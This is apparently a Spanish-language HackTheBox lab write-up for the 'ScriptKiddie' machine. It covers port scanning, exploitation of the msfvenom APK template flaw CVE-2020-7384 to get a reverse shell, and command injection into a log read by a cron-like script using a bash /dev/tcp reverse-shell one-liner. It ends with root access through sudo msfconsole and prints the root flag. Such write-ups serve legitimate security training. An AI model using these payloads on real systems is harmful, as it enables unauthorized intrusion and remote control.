---
title: "ScriptKiddie - HTB Writeup"
layout: single
excerpt: "ScriptKiddie es una máquina de HackTheBox de dificultad fácil, en la que se explota una vulnerabilidad de msfvenom para conseguir acceso a la máquina. Se obtiene el usuario root abusando de un privilegio de sudoers que nos permite ejecutar la herramienta metasploit como superusuario."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/126992857-306ecf51-ec41-485f-88cf-de8c58fa5038.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Msfvenom
  - Metasploit
  - Script Kiddie
---

![header](https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/ScriptKiddie-HackTheBox/header.png)

# Enumeración

Comenzamos enviando una traza ICMP a la máquina para ver si está activa y para detectar el OS:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/scriptKiddie/nmap]
└──╼ $ ping -c 1 10.10.10.226
PING 10.10.10.226 (10.10.10.226) 56(84) bytes of data.
64 bytes from 10.10.10.226: icmp_seq=1 ttl=63 time=92.0 ms

--- 10.10.10.226 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 91.973/91.973/91.973/0.000 ms
```

La máquina nos responde, y mediante el TTL veo que es una máquina linux.

Más información sobre la deteccion de OS mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/).

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier).

## Nmap

Seguimos con un escaneo de puertos con ```nmap```:

```bash
┌──z3r0byte@z3r0byte]─[~/CTF/HTB/scriptKiddie/nmap]
└──╼ $sudo nmap -p- -sS --min-rate 1500 -v -n 10.10.10.226 -oG allPorts 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 16:13 WEST
Initiating Ping Scan at 16:13
Scanning 10.10.10.226 [4 ports]
Completed Ping Scan at 16:13, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:13
Scanning 10.10.10.226 [65535 ports]
Discovered open port 22/tcp on 10.10.10.226
Discovered open port 5000/tcp on 10.10.10.226
Completed SYN Stealth Scan at 16:14, 62.11s elapsed (65535 total ports)
Nmap scan report for 10.10.10.226
Host is up (0.29s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 62.49 seconds
           Raw packets sent: 88652 (3.901MB) | Rcvd: 75840 (3.034MB)
```

Ejecuto otro escaneo para ver más información sobre los puertos abiertos:

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/scriptKiddie/nmap]
└──╼ $nmap -sC -sV -p22,5000 10.10.10.226 -oN targeted
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 16:18 WEST
Nmap scan report for 10.10.10.226
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
```
Vemos que hay un servidor HTTP en el puerto 5000, veamoslo.

# User

Voy hasta el servidor web usando el navegador:

![Navegador1](https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/ScriptKiddie-HackTheBox/Navegador1.png)

Tras probar todas las opciones disponibles e intentar inyectar comandos, me doy cuenta de que la sección 'Payloads' contiene un campo para subir un template
file.

Suponiendo que por detrás se está ejecutando un msfvenom, busco información acerca de los template files en msfvenom.

Y encuentro un exploit que se aprovecha de estos template files. [CVE-2020-7384](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7384)

Uso un [exploit](https://github.com/nikhil1232/CVE-2020-7384) de github que automatiza la explotación de esta vulnerabilidad.

Los pasos que seguí para conseguir una shell fueron los siguientes:

1. Ejecuto el exploit de github en mi máquina para generar una apk maliciosa

```bash

┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/scriptKiddie/content]
└──╼ $./CVE-2020-7384.sh 

CVE-2020-7384

Enter the LHOST: 
10.10.16.38

Enter the LPORT: 
4444

Select the payload type
1. nc
2. bash
3. python
4. python3

select: 2

Enter the Directory (absolute path) where you would like to save the apk file (Hit Enter to use the current directory): 

  adding: emptyfile (stored 0%)
jar signed.

Warning: 
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

New APK file Generated
Location: "/home/z3r0byte/CTF/HTB/scriptKiddie/content/exploit.apk"

The APK file generated could be now uploaded or used for exploitation

If you have access to the vulnerable machine then run:
msfvenom -x <your newly created apk> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null

┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/scriptKiddie/content]
└──╼ $
```
2. En el servidor web, En la parte de 'payloads' pongo de OS android, de LHOST 127.0.0.1 y subo el apk generado en el campo de _template file_

![navegador2](https://raw.githubusercontent.com/z3rObyte/z3rObyte.github.io/master/assets/images/ScriptKiddie-HackTheBox/Navegador2.png)

3. Nos ponemos en escucha por el puerto que hayamos puesto para la creación del apk

```bash
┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/scriptKiddie/content]
└──╼ $nc -lvnp 4444
Listening on 0.0.0.0 4444

```

4. Por último, en el servidor web, le damos click en el botón de _Generate_. Nos debería de llegar una shell.

```bash

┌─[z3r0byte@z3r0byte]─[~/CTF/HTB/scriptKiddie/content]
└──╼ $nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.226 33426
bash: cannot set terminal process group (893): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ 

```

A partir de aquí podríamos ver la flag user.txt en /home/kid/user.txt

# Root

Enumerando el sistema me doy cuenta de que hay más usuarios en el sistema.

```bash
kid@scriptkiddie:~$ grep -E 1[0-9]{3}  /etc/passwd | sed s/:/\ / | awk '{print $1}'

kid
pwn

kid@scriptkiddie:~$ 
```
Miro si tiene directorio personal en /home y si lo tiene.

Además tengo los privilegios de entrar a él.

Ahí, me encuentro un script llamado _scanlosers.sh_

```bash

kid@scriptkiddie:/home/pwn$ ls
recon  scanlosers.sh
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
kid@scriptkiddie:/home/pwn$ 

```
Tras un buen rato, intentando entender lo que hacia el script y tratando de averiguar como inyectar comandos, llegue a la siguiente conclusión.

Al modificar el archivo /home/kid/logs/hackers, el script scanlosers.sh se ejecuta.

Estuve intentando varias maneras de "bypassear" el cut que le aplica cuando lee el archivo hackers, hasta que lo conseguí.

```bash

echo " ;/bin/bash -c '/bin/bash -i>&/dev/tcp/10.10.16.38/4444 0>&1' # " > /no/existe 

```
Si no se pone el comentario del final, no te llegará la reverse shell.

## Usuario pwn

Una vez nos llega la shell, estamos como el usuario pwn.

```bash
pwn@scriptkiddie:~$ id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
pwn@scriptkiddie:~$
```

Hago ```sudo -l``` y veo que puedo ejecutar msfconsole como usuario root.

A partir de esto, la escalada es muy facil:

```bash
pwn@scriptkiddie:~$ sudo -l

Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

pwn@scriptkiddie:~$ sudo -u root /opt/metasploit-framework-6.0.9/msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View a modules description using info, or the enhanced version in your browser with info -d

msf6 > /bin/bash
[*] exec: /bin/bash

root@scriptkiddie:/home/pwn# cat /root/root.txt

9fb10676c35096d079eb083f7f99d7f3

root@scriptkiddie:/home/pwn#
```

Y ya seríamos root.

# Opinión

Me ha parecido una máquina muy divertida aunque la parte de conseguir inyeccion de comandos en el script _scanlosers.sh_ me haya resultado
un poco frustrante.








